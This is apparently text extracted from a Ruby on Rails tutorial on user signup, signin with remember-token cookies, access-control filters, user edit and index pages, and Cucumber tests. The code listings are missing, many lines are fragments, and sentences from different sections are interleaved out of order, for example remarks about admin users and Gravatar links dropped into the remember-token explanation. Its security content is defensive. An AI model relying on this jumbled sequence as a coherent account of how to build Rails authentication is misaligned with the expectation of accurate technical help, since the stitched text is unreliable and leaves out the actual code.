The purpose of our tests is to verify that clicking the signup button results in the correct behavior, creating a new user when the information is valid and not creating a user when it's invalid.
Here \kode{User.count} is \kode{0} because we reset the database at the beginning of this section.
When submitting invalid data, we expect the user count not to change; when submitting valid data, we expect it to change by 1.
We can express this in RSpec by combining the \kode{expect} method with either the \kode{to} method or the \kode{not\_to} method.
We'll start with the invalid case since it is simpler; we visit the signup path and click the button, and we expect it \emph{not to} change the user count:
This is for the benefit of the \kode{change} method, which takes as arguments an object and a symbol and then calculates the result of calling that symbol as a method on the object both before and after the block.
calculates
before and after the execution of
In the present case, we want the given code \emph{not} to change the count, which we express using the \kode{not\_to} method.
In effect, by enclosing the button click in a block we are able to replace
with the single line
which reads like natural language and is much more compact.
(Note that \kode{eq} is an RSpec method to test equality.)
The case of valid data is similar, but instead of verifying that the user count doesn't change, we check that clicking the button changes the count by 1:
This uses the \kode{to} method because we expect a click on the signup button with valid data \emph{to} change the user count by one.
as shown in Listing~\ref{code:basic_signup_tests}.
Here we've factored out the common text for the submit button using the \kode{let} method to define a \kode{submit} variable.
Good basic tests for signing up users.
To get them to pass, we have to create a signup page with just the right elements, arrange for the page's submission to be routed to the right place, and successfully create a new user in the database only if the resulting user data is valid.
Of course, at this point the tests should fail:
Now that we have good failing tests for user signup, we'll start getting them to pass by making a \emph{form} for signing up users.
The result appears in Listing~\ref{code:signup_form}
(Readers familiar with Rails~2.x should note that \kode{form\_for} uses the ``percent-equals'' ERb syntax for inserting content;
Let's break this down into pieces.
The presence of the \kode{do} keyword indicates that \kode{form\_for} takes a block with one variable, which we've called \kode{f} for ``form'':
As is usually the case with Rails helpers, we don't need to know any details about the implementation, but what we \emph{do} need to know is what the \kode{f} object does: when called with a method corresponding to an \href{http://www.w3schools.com/html/html_forms.asp}{HTML form element}---such as a text field, radio button, or password field---it returns code for that element specifically designed to set an attribute of the \kode{@user} object.
(The \kode{-e} here arranges to run just the examples whose description strings match \kode{"signup page"}.
in Listing~\ref{code:basic_signup_tests}.
To get these tests to pass again and to get our form to render, we must define an \kode{@user} variable in the controller action corresponding to \kode{new.html.erb}, i.e., the \kode{new} action in the Users controller.
as seen in Listing~\ref{code:new_action_with_user}.
With the \kode{@user} variable so defined, the test for the signup page should be passing again:
The signup form  \href{http://localhost:3000/signup}{/signup} for new users.~\href{http://railstutorial.org/images/figures/signup_form_bootstrap-full.png}{(full size)}
Although many of the details are irrelevant for our purposes, let's take a moment to highlight the most important parts of its structure.
(Here I've omitted some HTML related to the \emph{authenticity token}, which Rails automatically includes to thwart a particular kind of attack called a \emph{cross-site request forgery} (CSRF).
See \href{http://stackoverflow.com/questions/941594/understand-rails-authenticity-token}{the Stack Overflow entry on the Rails authenticity token} if you're interested in the details of how this works and why it's important.)
A filled-in form with \kode{text} and \kode{password} fields.~\href{http://railstutorial.org/images/figures/filled_in_form_bootstrap-full.png}{(full size)}
A mockup of the signup failure page.~\href{http://railstutorial.org/images/figures/signup_failure_mockup_bootstrap-full.png}{(full size)}
from Listing~\ref{code:basic_signup_tests} to
Note the comment: this is not the final implementation, but it's enough to get us started.
Signup failure.~\href{http://railstutorial.org/images/figures/signup_failure_rails_4-full.png}{(full size)}
Signup failure debug information.~\href{http://railstutorial.org/images/figures/signup_failure_rails_4_debug-full.png}{(full size)}
We can double-check this by verifying that the relevant tests fail:
-e "signup with invalid information"
Previous versions of Rails used a method called \kode{attr\_accessible} in the \emph{model} layer to solve this problem, but as of Rails~4.0 the preferred technique is to use so-called \emph{strong parameters} in the controller layer.
As a final step in handling failed user creation, we'll add helpful error messages to indicate the problems that prevented successful registration.
as shown in Listing~\ref{code:f_error_messages}.
in Listing~\ref{code:errors_partial}.
Failed signup with error messages.~\href{http://railstutorial.org/images/figures/signup_error_messages_bootstrap-full.png}{(full size)}
The result is shown in Figure~\ref{fig:blank_signup_password_digest}.
As you might guess from the working page, at this point the corresponding test should also pass:
The result of visiting \href{http://localhost:3000/signup}{/signup} and just clicking ``Create my account''.~\href{http://railstutorial.org/images/figures/blank_signup_password_digest_bootstrap_4_0-full.png}{(full size)}
A mockup of successful signup.~\href{http://railstutorial.org/images/figures/signup_success_mockup_bootstrap-full.png}{(full size)}
Currently, the test for valid submission should be failing:
This is because the default behavior for a Rails action is to render the corresponding view, but there is not (nor should there be) a view template corresponding to the \kode{create} action.
Instead, we need to redirect to a different page, and it makes sense for that page to be the newly created user's profile.
Note that we can omit the \kode{user\_url} in the redirect, writing simply \kode{redirect\_to @user} to redirect to the user show page.
Before submitting a valid registration in a browser, we're going to add a bit of polish common in web applications: a message that appears on the subsequent page (in this case, welcoming our new user to the application) and then disappears upon visiting a second page or on page reload.
The Rails way to accomplish this is to use a special variable called the \emph{flash}, which we can treat like a hash.
For example, if \kode{flash[:success] = "Welcome to the Sample App!"}, then the code
will produce this HTML:
(Note that the key \kode{:success} is a symbol, but embedded Ruby automatically converts it to the string \kode{"success"} before inserting it into the template.)
The reason we iterate through all possible key/value pairs is so that we can include other kinds of flash messages.
as shown in Listing~\ref{code:signup_flash}.
We can see the result of all this work by signing up our first user under the name ``Rails Tutorial'' and email address ``\texttt{example@railstutorial.org}''.
The results of a successful user signup, with flash message.~\href{http://railstutorial.org/images/figures/signup_flash_bootstrap-full.png}{(full size)}
The flash-less profile page after a browser reload.~\href{http://railstutorial.org/images/figures/signup_flash_reloaded_bootstrap-full.png}{(full size)}
We can now check our database just to be double-sure that the new user was actually created:
created_at: "2013-03-12 05:51:34", updated_at: "2013-03-12 05:51:34",
password_digest: "$2a$10$A58/j7wwh3aAffGkMAO9Q.jjh3jshd.6akhDKtchAz/R..."
A working signup page on the live Web.~\href{http://railstutorial.org/images/figures/signup_in_production_bootstrap-full.png}{(full size)}
in Listing~\ref{code:f_error_messages}.
in Listing~\ref{code:error_messages_test}.
Suggested error messages tests.
Tests for the post-save behavior in the \kode{create} action.
This will allow us to add customizations based on signin status and based on the identity of the current user.
For example, in this chapter we'll update the site header with signin/signout links and a profile link.
Having users sign in will also allow us to implement a security model, restricting access to particular pages based on the identity of the signed-in user.
In particular, we'll re-implement a couple of the RSpec integration tests in Cucumber to see how the two methods compare.
A \href{http://en.wikipedia.org/wiki/Session_(computer_science)}{\emph{session}} is a semi-permanent connection between two computers, such as a client computer running a web browser and a server running Rails.
We'll be using sessions to implement the common pattern of ``signing in'', and in this context there are several different models for session behavior common on the web: ``forgetting'' the session on browser close, using an optional ``remember me'' checkbox for persistent sessions, and automatically remembering sessions until the user explicitly signs out
We'll opt for the final of these options: when users sign in, we will remember their signin status ``forever'', clearing the session only when the user explicitly signs out.
It's convenient to model sessions as a RESTful resource: we'll have a signin page for \emph{new} sessions, signing in will \emph{create} a session, and signing out will \emph{destroy} it.
Unlike the Users resource, which uses a database back-end (via the User model) to persist data, the Sessions resource will use a \href{http://en.wikipedia.org/wiki/HTTP_cookie}{\emph{cookie}}, which is a small piece of text placed on the user's browser.
Much of the work involved in signin comes from building this cookie-based authentication machinery.
In this section and the next, we'll prepare for this work by constructing a Sessions controller, a signin form, and the relevant controller actions.
To get started, we'll generate a Sessions controller and an integration test for the authentication machinery:
A mockup of the signin form.~\href{http://railstutorial.org/images/figures/signin_mockup_bootstrap-full.png}{(full size)}
as shown in Listing~\ref{code:new_session_tests}.
Tests for the \kode{new} session action and view.
The tests initially fail, as required:
As with the Users resource, we can use the \kode{resources} method to define the standard RESTful routes:
Since we have no need to show or edit sessions, we've restricted the actions to \kode{new}, \kode{create}, and \kode{destroy} using the \kode{:only} option accepted by \kode{resources}.
Note the use of \kode{via: 'delete'} for the signout route, which indicates that it should be invoked using an HTTP \texttt{DELETE} request.
Note that the routes for signin and signout are custom, but the route for creating a session is simply the default (i.e., \kode{[resource name]\_path}).
page for  a new session (signin)
/signout
delete a session (sign out)
The initial Sessions controller.
The final step is to define the initial version of the signin page.
Note that, since it is the page for a new session, the signin page lives in the file \kode{app/views/sessions/new.html.erb}, which we have to create.
in Listing~\ref{code:initial_signin_page}.
The initial signin view.
As with the signup form, we can test the signin form by using Capybara to fill in the form values and then click the button.
In the process of writing the tests, we'll be forced to design aspects of the application, which is one of the nice side-effects of test-driven development.
A mockup of signin failure.~\href{http://railstutorial.org/images/figures/signin_failure_mockup_bootstrap-full.png}{(full size)}
We'll render the error as a flash message, which we can test for as follows:
The \kode{have\_selector} method checks for a particular selector element (i.e., an HTML tag, though as of Capybara~2.0 it only works for \emph{visible} elements).
In this case, we're looking for
which checks for a \kode{div} tag.
in Listing~\ref{code:initial_failing_signin_test}.
The tests for signin failure.
Having written tests for signin failure, we now turn to signin success.
The changes we'll test for are the rendering of the user's profile page (as determined by the page title, which should be the user's name), together with three planned changes to the site navigation:
The appearance of a link to the profile page
The appearance of a ``Sign out'' link
The disappearance of the ``Sign in'' link
A mockup of the user profile after a successful signin.~\href{http://railstutorial.org/images/figures/signin_success_mockup_bootstrap-full.png}{(full size)}
in Listing~\ref{code:signin_success_tests}.
Test for signin success.
Here we've introduced Capybara's \kode{have\_link} method.
It takes as arguments the text of the link and an optional \kode{:href} parameter, so that
ensures that the anchor tag~\kode{a} has the right \kode{href} (URL) attribute---in this case, a link to the user's profile page.
Note also that we take care to \kode{upcase} the user's email address to make sure our ability to find the user in the database is case-insensitive.
With our tests in place, we're ready to start developing the signin form.
The main difference between this and the signin form is that we have no Session model, and hence no analogue for the \kode{@user} variable.
as shown in Listing~\ref{code:signin_form}.
Code for the signin form.
The signin form  (\href{http://localhost:3000/signin}{/signin}).~\href{http://railstutorial.org/images/figures/signin_form_bootstrap-full.png}{(full size)}
As in the case of creating users (signup), the first step in creating sessions (signin) is to handle \emph{invalid} input.
in Listing~\ref{code:initial_create_session}.
Recalling that \kode{authenticate} returns \kode{false} for an invalid authentication, our strategy for user signin can be summarized as follows:
# Sign the user in and redirect to the user's show page.
# Create an error message and re-render the signin form.
Instead, we'll put a message in the flash to be displayed upon failed signin.
A first, slightly incorrect, attempt appears in Listing~\ref{code:failed_signin_attempt}.
An (unsuccessful) attempt at handling failed signin.
The flash message for a failed signin.~\href{http://railstutorial.org/images/figures/failed_signin_flash_bootstrap-full.png}{(full size)}
Unfortunately, as noted in the text and in the comment in Listing~\ref{code:failed_signin_attempt}, this code isn't quite right.
An example of the flash persisting.~\href{http://railstutorial.org/images/figures/flash_persistence_bootstrap-full.png}{(full size)}
This flash persistence is a bug in our application, and before proceeding with a fix it is a good idea to write a test catching the error.
In particular, the signin failure tests are currently passing:
But the tests should never pass when there is a known bug, so we should add a failing test to catch it.
Fortunately, dealing with a problem like flash persistence is one of many areas where integration tests really shine; they let us say exactly what we mean:
After submitting invalid signin data, this test follows the Home link in the site layout and then requires that the flash error message not appear.
in Listing~\ref{code:correct_signin_failure_test}.
Correct tests for signin failure.
The new test fails, as required:
To get the failing test to pass, instead of \kode{flash} we use \kode{flash.now}, which is specifically designed for displaying flash messages on rendered pages; unlike the contents of \kode{flash}, its contents disappear as soon as there is an additional request.
in Listing~\ref{code:correct_signin_failure}.
Correct code for failed signin.
Now the test suite for users with invalid information should be green:
Having handled a failed signin, we now need to actually sign a user in.
Getting there will require some of the most challenging Ruby programming so far in this tutorial, so hang in there through the end and be prepared for a little heavy lifting.
Happily, the first step is easy---completing the Sessions controller \kode{create} action is a snap.
Unfortunately, it's also a cheat.
We see now why this is a cheat: alas, \kode{sign\_in} doesn't currently exist.
Writing it will occupy the rest of this section.
The completed Sessions controller \kode{create} action (not yet working).
We're now in a position to start implementing our signin model, namely, remembering user signin status ``forever'' and ending the session only when the user explicitly signs out.
The signin functions themselves will end up crossing the traditional Model-View-Controller lines; in particular, several signin functions will need to be available in both controllers and views.
We could make an entirely new module for authentication, but the Sessions controller already comes equipped with a module, namely, \kode{SessionsHelper}.
By default, all the helpers are available in the views but not in the controllers.
We need the methods from the Sessions helper in both places, so we have to include it explicitly.
Because HTTP is a \href{http://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#HTTP_session_state}{\emph{stateless protocol}}, web applications requiring user signin must implement a way to track each user's progress from page to page.
One technique for maintaining the user signin status is to use a traditional Rails session (via the special \kode{session} function) to store a \emph{remember token} equal to the user's id:
This \kode{session} object makes the user id available from page to page by storing it in a cookie that expires upon browser close.
On each page, the application could simply call
to retrieve the user.
Because of the way Rails handles sessions, this process is secure; if a malicious user tries to spoof the user id, Rails will detect a mismatch based on a special \emph{session id} generated for each session.
For our application's design choice, which involves \emph{persistent} sessions---that is, signin status that lasts even after browser close---we need to use a \emph{permanent} identifier for the signed-in user.
To accomplish this, we'll generate a unique, secure remember token for each user and store it as a \emph{permanent} cookie rather than one that expires on browser close.
The User model with an added \kode{remember\_token} attribute.
A first test for the remember token.
We can get this test to pass by generating a remember token at the command line:
A migration to add a \kode{remember\_token} to the \kode{users} table.
Next we update the development and test databases as usual:
At this point the User model specs should be passing:
There are many mostly equivalent possibilities---essentially, any large random string will do just fine, as long as it's unique.
To make our remember token even more secure, we'll plan to change it every time a user creates a new session, which means that any \href{http://en.wikipedia.org/wiki/Session_hijacking}{hijacked sessions}---in which an attacker uses a stolen cookie to sign in as a particular user---will expire the next time a user signs in.
(Session hijacking was widely publicized by the \href{http://codebutler.com/firesheep}{Firesheep} application, which showed that remember tokens at many high-profile sites were visible when connected to public Wi-Fi networks.
Although in the actual application we will immediately sign in a newly created user (thus creating a new remember token as a side-effect), we don't want to rely on this behavior; a more robust practice is to ensure that \emph{every} user has a valid remember token right from the start.
Since we can't allow just any user to have such dangerous powers, we'll take care to create a privileged class of administrative users (admins) authorized to delete other users.
In that section, we used a \kode{before\_save} callback; this time, we'll use the closely related \kode{before\_create} callback to set the remember token when the user is first created
For more details on the kind of callbacks supported by Active Record, see the \href{http://guides.rubyonrails.org/v3.2.13/active_record_validations_callbacks.html}{discussion of callbacks at the Rails Guides}.
To test the remember token, we first save the test user (thereby creating it, since it has never been saved), and then check that the user's \kode{remember\_token} attribute isn't blank.
This gives us sufficient flexibility to change the random string if we ever need to.
The biggest difference is that, while anyone can sign up, only the current user should be able to update his information.
The result appears in Listing~\ref{code:remember_token_should_not_be_blank}
A test for a valid (nonblank) remember token.
First, note the link to change the Gravatar image; if you poke around the Gravatar site, you'll see that the page to add or edit images is located at \href{http://gravatar.com/emails}{http://gravatar.com/emails}, so we test the \kode{edit} page for a link with that URL
The Gravatar site actually redirects this to \href{http://en.gravatar.com/emails}{http://en.gravatar.com/emails}, which is for English language users, but I've omitted the \texttt{en} part to account for the use of other languages.
A mockup of the user edit page.~\href{http://railstutorial.org/images/figures/edit_user_mockup_bootstrap-full.png}{(full size)}
The result appears in Listing~\ref{code:user_edit_specs}
Tests for the user edit page.
This code, called a \emph{method reference}, arranges for Rails to look for a method called \kode{create\_remember\_token} and run it before saving the user.
Second, the method itself is only used internally by the User model, so there's no need to expose it to outside users.
To write the application code, we need to fill in the \kode{edit} action in the Users controller.
Recall that the id of the user is available in the \kode{params[:id]} variable, which means that we can find the user with the code in  Listing~\ref{code:initial_edit_action}.
will raise a \kode{NoMethodError} exception.
Finally, the \kode{create\_remember\_token} method needs to \emph{assign} to one of the user attributes, and in this context it is necessary to use the \kode{self} keyword in front of \kode{remember\_token}:
Because of the way Ruby handles assignments inside objects, without \kode{self} the assignment would create a \emph{local} variable called \kode{remember\_token}, which isn't what we want at all.
Using \kode{self} ensures that assignment sets the user's \kode{remember\_token}, and as a result it will be written to the database along with the other attributes when the user is saved.
(The call to \emph{to\_s} is to make sure we can handle \kode{nil} tokens, which shouldn't happen in browsers but sometimes happens in tests.)
in Listing~\ref{code:before_create_remember_token}.
A \kode{before\_create} callback to create \kode{remember\_token}.
By the way, the extra level of indentation on \kode{create\_remember\_token} is there to make it visually apparent which methods are defined after \kode{private}.
(Experience shows that this is a wise practice.)
As a final touch, we'll add a URL to the user settings link to the site navigation.
Now we're ready to write the first signin element, the \kode{sign\_in} function itself.
as shown in Listing~\ref{code:settings_link_test}.
Adding a test for the ``Settings'' link.
The result appears in Listing~\ref{code:sign_in_function}
The complete (but not-yet-working) \kode{sign\_in} function.
as shown in Listing~\ref{code:sign_in_helper}.
A test helper to sign users in.
# Sign in when not using Capybara.
Each element in the cookie is itself a hash of two elements, a \kode{value} and an optional \kode{expires} date.
For example, we could implement user signin by placing a cookie with value equal to the remember token that expires 20~years from now:
As noted in the comment line, filling in the form doesn't work when not using Capybara, so to cover this case we allow the user to pass the option \kode{no\_capyabara: true} to override the default signin method and manipulate the cookies directly.
<n>  => Sun, 13 Mar 2011 03:38:55 UTC +00:00
in Listing~\ref{code:delete_destroy_test}.
<n>  => Sat, 02 Jan 2010 03:39:14 UTC +00:00
Adding a ``Settings'' link.
This pattern of setting a cookie that expires 20 years in the future became so common that Rails added a special \kode{permanent} method to implement it, so that we can simply write
Having discussed how to store the user's remember token in a cookie for later use, we now need to learn how to retrieve the user on subsequent page views.
Let's look again at the \kode{sign\_in} function to see where we are:
The only code not presently working is
as shown in Listing~\ref{code:user_update_action_unsuccessful}.
To start writing the code for \kode{current\_user}, note that the line
With invalid information, the update attempt returns \kode{false}, so the \kode{else} branch re-renders the edit page.
is an \emph{assignment}, which we must define.
in Listing~\ref{code:current_user_equals}.
Defining assignment to \kode{current\_user}.
This might look confusing---most languages don't let you use the equals sign in a method definition---but it simply defines a method \kode{current\_user=} expressly designed to handle assignment to \kode{current\_user}.
thereby invoking the \kode{current\_user=} method.
Error message from submitting the update form.~\href{http://railstutorial.org/images/figures/edit_with_invalid_information_bootstrap-full.png}{(full size)}
The  \href{http://gravatar.com/}{Gravatar} image-cropping interface, with a picture of \href{http://michaelhartl.com/}{some dude}.
Its one argument is the right-hand side of the assignment, in this case the user to be signed in.
The tests for the \kode{update} action are similar to those for \kode{create}.
The one-line method body just sets an instance variable \kode{@current\_user}, effectively storing the user for later use.
as shown in  Listing~\ref{code:current_user_wrong}.
Tests for the user \kode{update} action.
A tempting but useless definition for \kode{current\_user}.
Don't use this line.
In fact, the two are exactly equivalent; \kode{attr\_accessor} is merely a convenient way to create just such getter/setter methods automatically.
from Listing~\ref{code:sign_in_helper} to
This reloads the \kode{user} variable from the test database using \kode{user.reload}, and then verifies that the user's new name and email match the new values.
The \kode{update} action needed to get the tests in Listing~\ref{code:user_update_specs} to pass is similar to the final form of the \kode{create} action (Listing~\ref{code:signin_upon_signup}), as seen in Listing~\ref{code:user_update_action}.
as shown in Listing~\ref{code:current_user_working}.
All this does is add
in Listing~\ref{code:user_update_action_unsuccessful}.
Finding the current user using the \kode{remember\_token}.
Its effect is to set the \kode{@current\_user} instance variable to the user corresponding to the remember token, but only if \kode{@current\_user} is undefined
With the code in this section, the user edit page should be working, as you can double-check by re-running the test suite, which should now be green:
Typically, this means assigning to variables that are initially \kode{nil}, but note that \kode{false} values will also be overwritten by the \kode{||=} operator.
In other words, the construction
calls the \kode{find\_by} method the first time \kode{current\_user} is called, but on subsequent invocations returns \kode{@current\_user} without hitting the database
This is only useful if \kode{current\_user} is used more than once for a single user request; in any case, \kode{find\_by} will be called at least once every time a user visits a page on the site.
In this section, we'll implement a security model that requires users to be signed in and prevents them from updating any information other than their own.
The \texttt{||=} construction is very Rubyish---that is, it is highly characteristic of the Ruby language---and hence important to learn if you plan on doing much Ruby programming.
A mockup of the result of visiting a protected page~\href{http://railstutorial.org/images/figures/signin_page_protected_mockup_bootstrap-full.png}{(full size)}
Though at first it may seem mysterious, \emph{or equals} is easy to understand by analogy.
Since the security restrictions for the \kode{edit} and \kode{update} actions are identical, we'll handle them in a single RSpec \kode{describe} block.
We start by noting a common idiom for changing a currently defined variable.
as seen in Listing~\ref{code:protected_edit_update_tests}.
Testing that the \kode{edit} and \kode{update} actions are protected.
Many computer programs involve incrementing a variable, as in
Most languages provide a syntactic shortcut for this operation; in Ruby (and in C, C++, Perl, Python, Java, etc.), it appears as follows:
<n>  >> x = 1
<n>  => 1
<n>  >> x += 1
<n>  => 2
<n>  >> x *= 3
<n>  => 6
This is necessary because there is no way for a browser to visit the \kode{update} action directly---it can only get there indirectly by submitting the edit form---so Capybara can't do it either.
<n>  >> x -= 7
<n>  => -1
But visiting the edit page only tests the authorization for the \kode{edit} action, not for \kode{update}.
As a result, the only way to test the proper authorization for the \kode{update} action itself is to issue a direct request. (
As you might guess, in addition to \kode{patch} Rails tests support \kode{get}, \kode{post}, and \kode{delete} as well.)
When using one of the methods to issue HTTP requests directly, we get access to the low-level \kode{response} object.
<n>  >> @user
Unlike the Capybara \kode{page} object, \kode{response} lets us test for the server response itself, in this case verifying that the \kode{update} action responds by redirecting to the signin page:
<n>  => nil
<n>  >> @user = @user || "the user"
as shown in Listing~\ref{code:authorize_before_filter}.
<n>  => "the user"
<n>  >> @user = @user || "another user"
Adding a \kode{signed\_in\_user} before filter.
Since \texttt{nil} is false in a boolean context, the first assignment is \texttt{nil || "the user"}, which evaluates to \texttt{"the user"}; similarly, the second assignment is \texttt{"the user" || "another user"}, which also evaluates to \texttt{"the user"}---since strings are \texttt{true} in a boolean context, the series of \texttt{||} expressions terminates after the first expression is evaluated.
Comparing the console sessions for the various operators, we see that \texttt{@user = @user || value} follows the \texttt{x = x O y} pattern with \texttt{||} in the place of \texttt{O}, which suggests the following equivalent construction:
<n>  >> @user ||= "the user"
We come finally to a practical application of all our signin/out work: we'll change the layout links based on signin status.
The way to change the links in the site layout involves using an<n>if-else branching structure inside of Embedded Ruby:
<n>  # Links for signed-in users
<n>  # Links for non-signed-in-users
This kind of code requires the existence of a \kode{signed\_in?}\ boolean, which we'll now define.
A user is signed in if there is a current user in the session, i.e., if \kode{current\_user} is non-\kode{nil}.
The signin form after trying to access a protected page.~\href{http://railstutorial.org/images/figures/protected_sign_in_bootstrap-full.png}{(full size)}
This requires the use of the ``not'' operator, written using an exclamation point~\kode{!} and usually read as ``bang''.
as shown in Listing~\ref{code:signed_in_p}.
Of course, requiring users to sign in isn't quite enough; users should only be allowed to edit their \emph{own} information.
Testing that the \kode{edit} and \kode{update} actions require the right user.
With the \kode{signed\_in?}\ method in hand, we're ready to finish the layout links.
but Rails allows us to link directly to the user, in this context automatically converting \kode{current\_user} into \kode{user\_path(current\_user)}.
In the process of putting the new links into the layout, we'll take advantage of Bootstrap's ability to make dropdown menus, which you can read more about on the \href{http://getbootstrap.com/2.3.2/components.html}{Bootstrap components page}.
Note here that a factory can take an option:
in Listing~\ref{code:layout_signin_signout_links}.
This creates a user with a different email address from the default.
Note in particular the CSS~ids and classes related to the Bootstrap dropdown menu.
The tests specify that the original user should not have access to the wrong user's \kode{edit} or \kode{update} actions.
Changing the layout links for signed-in users.
and similarly for \kode{update}.
Now that the \kode{correct\_user} before filter defines \kode{@user}, we can omit it from both actions.
Before moving on, you should verify that the test suite passes:
A signed-in user with new links and a dropdown menu.~\href{http://railstutorial.org/images/figures/profile_with_signout_link_bootstrap-full.png}{(full size)}
At this point, you should verify that you can sign in, close the browser, and then still be signed in when you visit the sample application.
In other words, if a non-logged-in user tries to visit the edit page, after signing in the user will be redirected to /users/1 instead of /users/1/edit.
The remember token cookie in the local browser.~\href{http://railstutorial.org/images/figures/cookie_in_browser-full.png}{(full size)}
To test for such ``friendly forwarding'', we first visit the user edit page, which redirects to the signin page.
In principle, although we are now done with authentication, newly registered users might be confused, as they are not signed in by default.
Implementing this is the last bit of polish before letting users sign out.
We then enter valid signin information and click the ``Sign in'' button.
The resulting page, which by default is the user's profile, should in this case be the ``Edit user'' page.
in Listing~\ref{code:friendly_forwarding_test}.
Testing that newly signed-up users are also signed in.
Here we've tested the appearance of the signout link to verify that the user was successfully signed in after signing up.
Now for the implementation
Signing in the user upon signup.
In order to forward users to their intended destination, we need to store the location of the requested page somewhere, and then redirect to that location instead.
In this section, we'll add this necessary signout capability.
So far, the Sessions controller actions have followed the RESTful convention of using \kode{new} for a signin page and \kode{create} to complete the signin.
We'll continue this theme by using a \kode{destroy} action to delete sessions, i.e., to sign out.
A test for signing out a user.
Adding \kode{store\_location} to the signed-in user before filter.
Destroying a session (user signout).
sign_out
As with the other authentication elements, we'll put \kode{sign\_out} in the Sessions helper module.
The \kode{sign\_out} method in the Sessions helper module.
in Listing~\ref{code:friendly_session_create}.
This completes the signup/signin/signout triumvirate, and the test suite should pass:
As usual, it's a good idea to verify that the test suite is green before proceeding:
It's worth noting that our test suite covers most of the authentication machinery, but not all of it.
For instance, we don't test how long the ``remember me'' cookie lasts or whether it gets set at all.
It is possible to do so, but experience shows that direct tests of cookie values are brittle and have a tendency to rely on implementation details that sometimes change from one Rails release to the next.
Along the way, we'll learn about populating the database with sample users and \emph{paginating} the user output so that the index page can scale up to display a potentially large number of users.
The result is breaking tests for application code that still works fine.
By focusing on high-level functionality---verifying that users can sign in, stay signed in from page to page, and can sign out---we test the core application code without focusing on less important details.
Having finished the foundation of the sample application's authentication system, we're going to take this opportunity to show how to write signin tests using \href{http://cukes.info}{Cucumber}, a popular tool for behavior-driven development that enjoys significant popularity in the Ruby community.
A mockup of the user index, with pagination and a ``Users'' nav link.~\href{http://railstutorial.org/images/figures/user_index_mockup_bootstrap-full.png}{(full size)}
Although we'll keep individual user \kode{show} pages visible to all site visitors, the user \kode{index} will be restricted to signed-in users so that there's a limit to how much unregistered users can see by default.
This section is optional and can be skipped without loss of continuity.
Cucumber allows the definition of plain-text \emph{stories} describing application behavior.
as shown in Listing~\ref{code:protected_index_test}.
Many Rails programmers find Cucumber especially convenient when doing client work; since they can be read even by non-technical users, Cucumber tests can be shared with (and can sometimes even be written by) the client.
Testing that the \kode{index} action is protected.
Of course, using a testing framework that isn't pure Ruby has a downside, and I find that the plain-text stories can be a bit verbose.
Nevertheless, Cucumber does have a place in the Ruby testing toolkit, and I especially like its emphasis on high-level behavior over low-level implementation.
Since the emphasis in this book is on RSpec and Capybara, the presentation that follows is necessarily superficial and incomplete, and will be a bit light on explanation.
Its purpose is just to give you a taste of Cucumber (crisp and juicy, no doubt)---if it strikes your fancy, there are entire books on the subject waiting to satisfy your appetite.
Adding the \texttt{cucumber-rails} gem to the \kode{Gemfile.}
as shown in Listing~\ref{code:signed_in_user_index}.
Requiring a signed-in user for the \kode{index} action.
To set up the application to use Cucumber, we next generate some necessary support files and directories:
This creates a \kode{features/} directory where the files associated with Cucumber will live.
The next set of tests makes sure that, for signed-in users, the index page has the right title/content and lists all of the site's users.
Cucumber features are descriptions of expected behavior using a plain-text  language called \href{https://github.com/cucumber/gherkin}{Gherkin}.
The method is to make three factory users (signing in as the first one) and then verify that the index page has a list element (\kode{li}) tag for the name of each one.
Gherkin tests read much like well-written RSpec examples, but because they are plain-text they are more accessible to those more comfortable reading English than Ruby code.
as shown in Listing~\ref{code:user_index_tests}.
in Listing~\ref{code:initial_failing_signin_test} and
Tests for the user index page.
To get started, we'll create a file in the \kode{features/} directory called \kode{signing\_in.feature}.
Cucumber features start with a short description of the feature, as follows:
Then they add individual \emph{scenarios}.
For example, to test unsuccessful signin, we could write the following scenario:
as seen in Listing~\ref{code:user_index}.
Similarly, to test successful signin, we could add this:
in  Listing~\ref{code:signin_features}.
Cucumber features to test user signin.
To make the actual index page, we need to make a view that iterates through the users and wraps each one in an~\kode{li} tag.
To run the features, we use the \kode{cucumber} executable:
The code in Listing~\ref{code:user_index_view} uses the result of  Listing~\ref{code:gravatar_option} from Section~\ref{sec:signup_exercises}, which allows us to pass an option to the Gravatar helper specifying a size other than the default.
In this context, it's worth noting that, like RSpec, Cucumber can be invoked using a Rake task:
(For reasons that escape me, this is sometimes written as \kode{rake cucumber:ok}.)
All we've done so far is write some plain text, so it shouldn't be surprising that the Cucumber scenarios aren't yet passing.
To get the test suite to green, we need to add a \emph{step} file that maps the plain-text lines to Ruby code.
The step file goes in the \kode{features/step\_definitions} directory; we'll call it \kode{authentication\_steps.rb}.
A test for the ``Users'' link URL.
The \kode{Feature} and \kode{Scenario} lines are mainly for documentation, but each of the other lines needs some corresponding Ruby.
For example, the line
in the feature file gets handled by the step definition
In the feature, \kode{Given} is just a string, but in the step file \kode{Given} is a \emph{method} that takes a regular expression and a block.
The regex matches the text of the line in the scenario, and the contents of the block are the Ruby code needed to implement the step.
In this case, ``a user visits the signin page'' is implemented by
If this looks familiar, it should: it's just Capybara, which is included by default in Cucumber step files.
The next two lines should also look familiar; the scenario steps
in the feature file are handled by these steps:
The first step also uses Capybara, while the second uses Capybara's \kode{page} object with RSpec. Evidently, all the testing work we've done so far with RSpec and Capybara is also useful with Cucumber.
The rest of the steps proceed similarly.
in Listing~\ref{code:authentication_steps}.
Try adding one step at a time, running
With that, the user index is fully functional, with all tests passing:
each time until the tests pass.
The complete steps needed to get the signin features to pass.
The user index page  \href{http://localhost:3000/users}{/users} with only one user.~\href{http://railstutorial.org/images/figures/user_index_only_one_bootstrap-full.png}{(full size)}
Having written some simple Cucumber scenarios, it's worth comparing the result to the equivalent RSpec examples.
in Listing~\ref{code:signin_features} and
Next, we'll add a Rake task to create sample users.
Then take a look at the RSpec request specs (integration tests):
as seen in Listing~\ref{code:db_populate}.
(This is a bit advanced, so don't worry too much about the details.)
A Rake task for populating the database with sample users.
You can see how a case could be made for either Cucumber or integration tests.
Cucumber features are easily readable, but they are entirely separate from the code that implements them---a property that cuts both ways.
I find that Cucumber is easy to read and awkward to write, while integration tests are (for a programmer) a little harder to read and \emph{much} easier to write.
One nice effect of Cucumber's separation of concerns is that it operates at a higher level of abstraction.
This defines a task \kode{db:populate} that creates an example user with name and email address replicating our previous one, and then makes 99 more.
ensures that the Rake task has access to the local Rails environment, including the User model (and hence \kode{User.create!}).
This noisier construction makes debugging easier by avoiding silent errors.
For example, we write
to express the expectation of seeing an error message, and
to implement the test. What's especially convenient about this is that only the second element (the step) is dependent on the implementation, so that if we change, e.g., the CSS class used for error messages, the feature file would stay the same.
